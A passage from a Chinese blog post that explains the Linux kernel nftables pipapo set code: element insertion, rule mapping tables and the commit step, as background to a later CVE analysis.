class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *lt;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">nft_pipapo_map_bucket</span> *<span class="title">mt</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在该循环中主要是对上述结构体赋值操作。这里主要对bb做了赋值为8，然后就是groups赋值为len，witdh则是赋值为len对4向上取整的倍数。</p><p>最后通过<code>pipapo_clone</code>函数创建一个新的<code>nft_pipapo_match</code>结构赋值给<code>((struct nft_pipapo *)set-&gt;data)-&gt;clone</code>成员，最后直接将m赋值给<code>((struct nft_pipapo *)set-&gt;data)-&gt;match</code>成员。</p><h3 id="nft-pipapo-insert"><a href="#nft-pipapo-insert" class="headerlink" title="nft_pipapo_insert"></a>nft_pipapo_insert</h3><p>前面主要关注了set的申请及初始过程这里来关注一个element是怎么被链到set中的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_pipapo_insert</span><span class="params">(<span class="keyword">const</span> struct net *net, <span class="keyword">const</span> struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> struct nft_set_elem *elem,</span></span></span><br><span class="line"><span class="params"><span class="function">     struct nft_set_ext **ext2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ext</span> *<span class="title">ext</span> =</span> nft_set_elem_ext(<span class="built_in">set</span>, elem-&gt;priv);</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">nft_pipapo_map_bucket</span> <span class="title">rulemap</span>[<span class="title">NFT_PIPAPO_MAX_FIELDS</span>];</span></span><br><span class="line"><span class="keyword">const</span> u8 *start = (<span class="keyword">const</span> u8 *)elem-&gt;key.val.data, *end;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo_elem</span> *<span class="title">e</span> =</span> elem-&gt;priv, *dup;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo</span> *<span class="title">priv</span> =</span> nft_set_priv(<span class="built_in">set</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo_match</span> *<span class="title">m</span> =</span> priv-&gt;clone;</span><br><span class="line">u8 genmask = nft_genmask_next(net);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo_field</span> *<span class="title">f</span>;</span></span><br><span class="line"><span class="keyword">const</span> u8 *start_p, *end_p;</span><br><span class="line"><span class="keyword">int</span> i, bsize_max, err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_KEY_END))</span><br><span class="line">end = (<span class="keyword">const</span> u8 *)nft_set_ext_key_end(ext)-&gt;data;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">end = start;</span><br><span class="line"></span><br><span class="line">dup = pipapo_get(net, <span class="built_in">set</span>, start, genmask);</span><br><span class="line"><span class="keyword">if</span> (!IS_ERR(dup)) &#123;</span><br><span class="line"><span class="comment">/* Check if we already have the same exact entry */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_data</span> *<span class="title">dup_key</span>, *<span class="title">dup_end</span>;</span></span><br><span class="line"></span><br><span class="line">dup_key = nft_set_ext_key(&amp;dup-&gt;ext);</span><br><span class="line"><span class="keyword">if</span> (nft_set_ext_exists(&amp;dup-&gt;ext, NFT_SET_EXT_KEY_END))</span><br><span class="line">dup_end = nft_set_ext_key_end(&amp;dup-&gt;ext);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">dup_end = dup_key;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">memcmp</span>(start, dup_key-&gt;data, <span class="keyword">sizeof</span>(*dup_key-&gt;data)) &amp;&amp;</span><br><span class="line">    !<span class="built_in">memcmp</span>(end, dup_end-&gt;data, <span class="keyword">sizeof</span>(*dup_end-&gt;data))) &#123;</span><br><span class="line">*ext2 = &amp;dup-&gt;ext;</span><br><span class="line"><span class="keyword">return</span> -EEXIST;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> -ENOTEMPTY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(dup) == -ENOENT) &#123;</span><br><span class="line"><span class="comment">/* Look for partially overlapping entries */</span></span><br><span class="line">dup = pipapo_get(net, <span class="built_in">set</span>, end, nft_genmask_next(net));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(dup) != -ENOENT) &#123;</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(dup))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(dup);</span><br><span class="line">*ext2 = &amp;dup-&gt;ext;</span><br><span class="line"><span class="keyword">return</span> -ENOTEMPTY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Validate */</span></span><br><span class="line">start_p = start;</span><br><span class="line">end_p = end;</span><br><span class="line">nft_pipapo_for_each_field(f, i, m) &#123;</span><br><span class="line"><span class="keyword">if</span> (f-&gt;rules &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)NFT_PIPAPO_RULE0_MAX)</span><br><span class="line"><span class="keyword">return</span> -ENOSPC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">memcmp</span>(start_p, end_p,</span><br><span class="line">   f-&gt;groups / NFT_PIPAPO_GROUPS_PER_BYTE(f)) &gt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">start_p += NFT_PIPAPO_GROUPS_PADDED_SIZE(f);</span><br><span class="line">end_p += NFT_PIPAPO_GROUPS_PADDED_SIZE(f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Insert */</span></span><br><span class="line">priv-&gt;dirty = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">bsize_max = m-&gt;bsize_max;</span><br><span class="line"></span><br><span class="line">nft_pipapo_for_each_field(f, i, m) &#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">rulemap[i].to = f-&gt;rules;</span><br><span class="line"></span><br><span class="line">ret = <span class="built_in">memcmp</span>(start, end,</span><br><span class="line">     f-&gt;groups / NFT_PIPAPO_GROUPS_PER_BYTE(f));</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = pipapo_insert(f, start, f-&gt;groups * f-&gt;bb);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = pipapo_expand(f, start, end, f-&gt;groups * f-&gt;bb);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (f-&gt;bsize &gt; bsize_max)</span><br><span class="line">bsize_max = f-&gt;bsize;</span><br><span class="line"></span><br><span class="line">rulemap[i].n = ret;</span><br><span class="line"></span><br><span class="line">start += NFT_PIPAPO_GROUPS_PADDED_SIZE(f);</span><br><span class="line">end += NFT_PIPAPO_GROUPS_PADDED_SIZE(f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!*get_cpu_ptr(m-&gt;scratch) || bsize_max &gt; m-&gt;bsize_max) &#123;</span><br><span class="line">put_cpu_ptr(m-&gt;scratch);</span><br><span class="line"></span><br><span class="line">err = pipapo_realloc_scratch(m, bsize_max);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">m-&gt;bsize_max = bsize_max;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">put_cpu_ptr(m-&gt;scratch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*ext2 = &amp;e-&gt;ext;</span><br><span class="line"></span><br><span class="line">pipapo_map(m, rulemap, e);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在看这里代码的时候最好结合前文中的<code>nft_add_set_elem</code>配合着看，这里的参数elem并不是真正的element而只是在栈上的结构，这里真正的element是elem-&gt;priv。</strong></p><p>函数开头首先是通过<code>nft_set_elem_ext</code>函数拿出真是elem中的ext段，也就是数据段<code>key、key_end、data</code>等都在此段中。</p><p>随后创建一个结构为<code>nft_pipapo_map_bucket</code>的数组，这个结构很眼熟因为在前面的<code>nft_pipapo_field</code>结构体中也看到过此结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * union nft_pipapo_map_bucket - Bucket of mapping table</span></span><br><span class="line"><span class="comment"> * @to:First rule number (in next field) this rule maps to</span></span><br><span class="line"><span class="comment"> * @n:Number of rules (in next field) this rule maps to</span></span><br><span class="line"><span class="comment"> * @e:If there&#x27;s no next field, pointer to element this rule maps to</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">nft_pipapo_map_bucket</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> BITS_PER_LONG == 64</span></span><br><span class="line"><span class="keyword">static_assert</span>(NFT_PIPAPO_MAP_TOBITS &lt;= <span class="number">32</span>);</span><br><span class="line">u32 to;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static_assert</span>(NFT_PIPAPO_MAP_NBITS &lt;= <span class="number">32</span>);</span><br><span class="line">u32 n;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> to:NFT_PIPAPO_MAP_TOBITS;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>  n:NFT_PIPAPO_MAP_NBITS;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo_elem</span> *<span class="title">e</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到结构体中存在一个成员结构正好为<code>nft_pipapo_elem</code>，不难猜到这个结构体就是最终用于存放element的结构体。</p><p>接着从栈上的elem取出key赋值给start，接着将真实的element赋值给e，随后和前面的init类似，取出set中的data字段当作<code>nft_pipapo</code>使用。</p><p>接着会判断是否存在<code>key_end</code>如果有则取出，如果没有则直接将end指向start。</p><p>随后就是对key的判断是否以及存在之类的，最后的for循环才是真正的插入过程。</p><p>首先会让<code>rulemap[i].to</code>等于<code>f-&gt;rules</code>，这里的简单介绍一下上面的结构体中，to的含义为下一个rule的标号，n表示的是下一个rule的个数（后面看到了上面其实并不是结构体是union哈）。知道了这两个是干什么的再去看insert就会很好理解了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pipapo_insert</span><span class="params">(struct nft_pipapo_field *f, <span class="keyword">const</span> <span class="keyword">uint8_t</span> *k,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">int</span> mask_bits)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> rule = f-&gt;rules++, group, ret, bit_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">ret = pipapo_resize(f, f-&gt;rules - <span class="number">1</span>, f-&gt;rules);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (group = <span class="number">0</span>; group &lt; f-&gt;groups; group++) &#123;</span><br><span class="line"><span class="keyword">int</span> i, v;</span><br><span class="line">u8 mask;</span><br><span class="line"></span><br><span class="line">v = k[group / (BITS_PER_BYTE / f-&gt;bb)];</span><br><span class="line">v &amp;= GENMASK(BITS_PER_BYTE - bit_offset - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">v &gt;&gt;= (BITS_PER_BYTE - bit_offset) - f-&gt;bb;</span><br><span class="line"></span><br><span class="line">bit_offset += f-&gt;bb;</span><br><span class="line">bit_offset %= BITS_PER_BYTE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mask_bits &gt;= (group + <span class="number">1</span>) * f-&gt;bb) &#123;</span><br><span class="line"><span class="comment">/* Not masked */</span></span><br><span class="line">pipapo_bucket_set(f, rule, group, v);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (mask_bits &lt;= group * f-&gt;bb) &#123;</span><br><span class="line"><span class="comment">/* Completely masked */</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NFT_PIPAPO_BUCKETS(f-&gt;bb); i++)</span><br><span class="line">pipapo_bucket_set(f, rule, group, i);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* The mask limit falls on this group */</span></span><br><span class="line">mask = GENMASK(f-&gt;bb - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">mask &gt;&gt;= mask_bits - group * f-&gt;bb;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NFT_PIPAPO_BUCKETS(f-&gt;bb); i++) &#123;</span><br><span class="line"><span class="keyword">if</span> ((i &amp; ~mask) == (v &amp; ~mask))</span><br><span class="line">pipapo_bucket_set(f, rule, group, i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pipapo_lt_bits_adjust(f);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面大多是对数据做处理我们暂时先不关心，主要看其中的<code>pipapo_resize</code>函数，这个函数的作用就是将lt和mt根据当前的rule数量进行重新申请，因为在前面init时这俩都为0，即便是在clone之后也是如此，所以这里会先在函数开头重新分配。最后中间则是根据maskbit进行处理，最后返回1，这里返回的1是给到了<code>rulemap[i].n</code>的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pipapo_expand</span><span class="params">(struct nft_pipapo_field *f,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">const</span> u8 *start, <span class="keyword">const</span> u8 *end, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> step, masks = <span class="number">0</span>, bytes = DIV_ROUND_UP(len, BITS_PER_BYTE);</span><br><span class="line">u8 base[NFT_PIPAPO_MAX_BYTES];</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(base, start, bytes);</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">memcmp</span>(base, end, bytes) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">step = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (pipapo_step_diff(base, step, bytes)) &#123;</span><br><span class="line"><span class="keyword">if</span> (pipapo_step_after_end(base, end, step, bytes))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">step++;</span><br><span class="line"><span class="keyword">if</span> (step &gt;= len) &#123;</span><br><span class="line"><span class="keyword">if</span> (!masks) &#123;</span><br><span class="line">pipapo_insert(f, base, <span class="number">0</span>);</span><br><span class="line">masks = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = pipapo_insert(f, base, len - step);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">masks++;</span><br><span class="line">pipapo_base_sum(base, step, bytes);</span><br><span class="line">&#125;</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> masks;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里在简单看一下expand，这种情况就是start和end不一致时会产生的，这表明这个field中存在多条规则，最终返回masks。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pipapo_map</span><span class="params">(struct nft_pipapo_match *m,</span></span></span><br><span class="line"><span class="params"><span class="function">       <span class="keyword">union</span> nft_pipapo_map_bucket <span class="built_in">map</span>[NFT_PIPAPO_MAX_FIELDS],</span></span></span><br><span class="line"><span class="params"><span class="function">       struct nft_pipapo_elem *e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo_field</span> *<span class="title">f</span>;</span></span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>, f = m-&gt;f; i &lt; m-&gt;field_count - <span class="number">1</span>; i++, f++) &#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="built_in">map</span>[i].n; j++) &#123;</span><br><span class="line">f-&gt;mt[<span class="built_in">map</span>[i].to + j].to = <span class="built_in">map</span>[i + <span class="number">1</span>].to;</span><br><span class="line">f-&gt;mt[<span class="built_in">map</span>[i].to + j].n = <span class="built_in">map</span>[i + <span class="number">1</span>].n;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Last field: map to ext instead of mapping to next field */</span></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="built_in">map</span>[i].n; j++)</span><br><span class="line">f-&gt;mt[<span class="built_in">map</span>[i].to + j].e = e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是这里比较重要的<code>pipapo_map</code>函数，这里会根据前面的结果对<code>f-&gt;mt</code>赋值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">field_count = <span class="number">2</span>;</span><br><span class="line">f1-&gt;rules = <span class="number">0</span>;</span><br><span class="line">f2-&gt;rules = <span class="number">0</span>;</span><br><span class="line">rulemap = [</span><br><span class="line">    &#123;to:<span class="number">0</span>, n:<span class="number">1</span>&#125;,</span><br><span class="line">    &#123;to:<span class="number">0</span>, n:<span class="number">1</span>&#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">↓↓↓↓↓↓    变为</span><br><span class="line"></span><br><span class="line">f1-&gt;rules = <span class="number">1</span>;</span><br><span class="line">f2-&gt;rules = <span class="number">1</span>;</span><br><span class="line">f1-&gt;mt = [</span><br><span class="line">    &#123;to:<span class="number">0</span>, n:<span class="number">1</span>&#125;</span><br><span class="line">];</span><br><span class="line">f2-&gt;mt = [</span><br><span class="line">    &#123;e: element&#125;</span><br><span class="line">];</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">field_count = <span class="number">3</span>;</span><br><span class="line">f1-&gt;rules = <span class="number">0</span>;</span><br><span class="line">f2-&gt;rules = <span class="number">0</span>;</span><br><span class="line">f3-&gt;rules = <span class="number">0</span>;</span><br><span class="line">rulemap = [</span><br><span class="line">    &#123;to:<span class="number">0</span>, n:<span class="number">2</span>&#125;,</span><br><span class="line">    &#123;to:<span class="number">2</span>, n:<span class="number">1</span>&#125;,</span><br><span class="line">    &#123;to:<span class="number">3</span>, n:<span class="number">2</span>&#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">↓↓↓↓↓↓    变为</span><br><span class="line"></span><br><span class="line">f1-&gt;rules = <span class="number">2</span>;</span><br><span class="line">f2-&gt;rules = <span class="number">1</span>;</span><br><span class="line">f3-&gt;rules = <span class="number">2</span>;</span><br><span class="line">f1-&gt;mt = [</span><br><span class="line">    &#123;to:<span class="number">2</span>, n:<span class="number">1</span>&#125;,</span><br><span class="line">    &#123;to:<span class="number">2</span>, n:<span class="number">1</span>&#125;</span><br><span class="line">];</span><br><span class="line">f2-&gt;mt = [</span><br><span class="line">    &#123;to:<span class="number">3</span>, n:<span class="number">2</span>&#125;;</span><br><span class="line">];</span><br><span class="line">f3-&gt;mt = [</span><br><span class="line">    &#123;e: element&#125;,</span><br><span class="line">    &#123;e: element&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>最终会形成如上形式，目前element存在于set的这样一条链中<code>((struct nft_pipapo *)set-&gt;data)-&gt;clone-&gt;f-&gt;mt[i].e</code>中，在开头我们也说了clone成员代表的是临时存放的，所以最后还会通过commit提交进行进一步处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> NFT_MSG_NEWSETELEM:</span><br><span class="line">        te = (struct nft_trans_elem *)trans-&gt;data;</span><br><span class="line"></span><br><span class="line">        nft_setelem_activate(net, te-&gt;<span class="built_in">set</span>, &amp;te-&gt;elem);</span><br><span class="line">        nf_tables_setelem_notify(&amp;trans-&gt;ctx, te-&gt;<span class="built_in">set</span>,</span><br><span class="line">                     &amp;te-&gt;elem,</span><br><span class="line">                     NFT_MSG_NEWSETELEM);</span><br><span class="line">        <span class="keyword">if</span> (te-&gt;<span class="built_in">set</span>-&gt;ops-&gt;commit &amp;&amp;</span><br><span class="line">            list_empty(&amp;te-&gt;<span class="built_in">set</span>-&gt;pending_update)) &#123;</span><br><span class="line">            list_add_tail(&amp;te-&gt;<span class="built_in">set</span>-&gt;pending_update,</span><br><span class="line">                      &amp;set_update_list);</span><br><span class="line">        &#125;</span><br><span class="line">        nft_trans_destroy(trans);</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>最后来到<code>nf_tables_commit</code>函数这里主要是对trans和element进行处理，这里主要就是将set加入到更新列表中，对trans处理就不过多提及对element处理会在复现前面提到的CVE-2024-1085详细分析。函数最后会调用<code>nft_set_commit_update</code>函数对这里加入更新列表的进行处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nft_set_commit_update</span><span class="params">(struct list_head *set_update_list)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set</span> *<span class="title">set</span>, *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">list_for_each_entry_safe(<span class="built_in">set</span>, next, set_update_list, pending_update) &#123;</span><br><span class="line">list_del_init(&amp;<span class="built_in">set</span>-&gt;pending_update);</span><br><span class="line"></span><br><span class="line"><span 